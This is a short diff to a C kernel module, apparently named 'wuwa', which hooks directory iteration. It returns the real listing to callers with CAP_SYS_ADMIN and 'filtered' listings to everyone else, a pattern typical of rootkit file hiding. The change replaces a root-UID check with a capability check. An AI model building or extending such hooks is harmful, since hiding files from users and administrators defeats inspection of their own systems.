@@ -98,8 +98,11 @@ static int wuwa_iterate_shared(struct file *filp, struct dir_context *ctx)
     orig = READ_ONCE(orig_iterate);
     if (!orig)
         return -ENOSYS;
-    /* Root sees everything (debugging); everyone else gets filtered. */
-    if (uid_eq(current_euid(), GLOBAL_ROOT_UID))
+    /* Privileged sees everything (debugging); everyone else gets
+     * filtered. capable() resolves creds with the RUNNING kernel's own
+     * offsets — no header-layout dependence (current_euid() inlines
+     * task->cred access from build headers). */
+    if (capable(CAP_SYS_ADMIN))
         return orig(filp, ctx);
     if (!try_module_get(THIS_MODULE))
         return orig(filp, ctx); /* teardown race: passthrough, never crash */
